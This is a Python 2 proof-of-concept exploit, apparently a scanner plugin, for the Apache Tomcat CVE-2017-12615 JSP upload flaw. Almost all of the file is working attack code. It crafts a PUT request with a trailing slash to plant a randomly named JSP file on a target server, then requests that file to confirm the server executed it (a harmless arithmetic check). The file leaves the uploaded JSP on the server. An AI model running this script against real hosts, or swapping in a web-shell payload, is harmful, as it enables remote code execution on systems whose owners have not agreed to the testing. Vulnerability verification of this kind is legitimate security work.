# coding:utf-8
# author:nearg1e

''' poc for CVE-2017-12615 '''
import urllib2
import random
import string
import urlparse
from config import is_port_open, is_http



class PutRequest(urllib2.Request):
    '''support put method in urllib2'''
    def __init__(self, *args, **kwargs):
        self._method = "PUT"
        return urllib2.Request.__init__(self, *args, **kwargs)

    def get_method(self, *args, **kwargs):
        return "PUT"

def random_str(length):
    pool = string.digits + string.ascii_lowercase
    return "".join(random.choice(pool) for _ in range(length))


@is_port_open
def verify(host, port=80, name='', timeout=10):
    if is_http(host, int(port)) is False:
        return
    result = ""

    payload = "<%out.println(1963*4);%>"
    filename = "{}.jsp".format(random_str(16))
    if port == 443:
        url = "https://%s" % (host)
    else:
        url = "http://%s:%d" % (host, port)
    url = urllib2.urlopen(url, timeout=timeout).geturl()
    shell_url = urlparse.urljoin(url, filename)
    target_url = shell_url + "/"
    request = PutRequest(target_url, payload)
    try:
        urllib2.urlopen(request, timeout=timeout)
    except Exception as e:
        print("[!] {}".format(str(e)))
        return False
    else:
        try:
            resp = urllib2.urlopen(shell_url, timeout=timeout)
        except Exception as e:
            print("[!] get shell url error {}".format(str(e)))
            return False
        else:
            if "7852" in resp.read():
                info = {
                    "url": shell_url,
                    "vuln_name": "tomcat cve-2017-12615 rce",
                    "severity": "high",
                    "proof": "url={}&return={}".format(shell_url, '7852')
                }
                # result += u"存在任意代码执行风险"
                # result += u" 地址: {}".format(shell_url)
                return info

if __name__ == '__main__':
    print(verify("127.0.0.1", 8080 ))

